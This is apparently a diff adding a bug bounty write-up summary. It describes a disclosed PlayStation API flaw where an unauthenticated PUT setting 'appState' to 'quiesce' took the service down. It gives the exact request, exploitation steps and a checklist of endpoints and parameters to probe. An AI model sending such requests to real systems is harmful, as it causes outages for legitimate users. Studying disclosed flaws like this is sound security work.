@@ -299,3 +299,161 @@ Main question:
 Trusted redirect + weak URL validation (+ leaked API key) = Open Redirect.
 
 </details>
+---
+
+<details>
+<summary><b>🔴 Unrestricted Access to Application State API Leads to Denial of Service</b></summary>
+
+<br>
+
+**Source:** [HackerOne Report #993722](https://hackerone.com/reports/993722)
+
+---
+
+## 🐞 Vulnerability
+
+A missing authorization check existed on the PlayStation REST API endpoint:
+
+```
+PUT /api/application/state
+```
+
+This endpoint let the caller modify the application's state via a user-controlled JSON body:
+
+```json
+{
+  "appState": "quiesce"
+}
+```
+
+The `quiesce` state placed the application into an unavailable condition. Since the endpoint didn't verify the requester's privileges, any unauthenticated attacker could flip the app into this state and take the service down.
+
+Attack flow:
+
+```
+Unauthenticated Attacker
+      |
+      v
+PUT /api/application/state
+      |
+      v
+Application Disabled
+```
+
+---
+
+## 🔍 Root Cause
+
+A sensitive, state-changing function was exposed with no authorization check — the API assumed only admins would know about or call it, rather than enforcing that at the server.
+
+```
+Any User
+   |
+   v
+State Management API
+   |
+   v
+Application Configuration Changed
+```
+
+---
+
+## ⚔️ Exploitation
+
+1. Find an API endpoint responsible for application state:
+
+```
+/api/application/state
+```
+
+2. Change the method from `GET` to `PUT`.
+
+3. Send:
+
+```
+PUT /api/application/state HTTP/1.1
+Content-Type: application/json
+
+{
+  "appState": "quiesce"
+}
+```
+
+4. No privilege check is performed — the state changes immediately.
+
+5. The application starts returning:
+
+```
+502 Bad Gateway
+```
+
+---
+
+## 🔗 Attack Chain
+
+```
+Missing Authorization
+      |
+      v
+Access Sensitive API Function
+      |
+      v
+Change Application State
+      |
+      v
+Denial of Service
+```
+
+---
+
+## 🎯 Impact
+
+- Disable application availability
+- Trigger downtime with zero authentication
+- Disrupt service for all legitimate users, from a single request
+
+---
+
+## 🎯 Hunting Strategy
+
+Look for endpoints that perform sensitive actions:
+
+```
+/state
+/status
+/config
+/settings
+/admin
+/maintenance
+/shutdown
+/disable
+```
+
+Test:
+
+- Hidden/undocumented endpoints
+- Different HTTP methods on the same path (`GET`, `POST`, `PUT`, `DELETE`)
+- Admin-sounding functionality without an auth header
+- Whether role/permission is actually enforced server-side, not just hidden client-side
+
+Common parameters:
+
+```
+state
+status
+action
+role
+permission
+enabled
+config
+```
+
+Main question:
+
+"Can I call an administrative function, or change something that should only be controlled by privileged users, without having the required permissions?"
+
+---
+
+Sensitive function + missing authorization = **Broken Function Level Authorization (BFLA)**.
+
+</details>
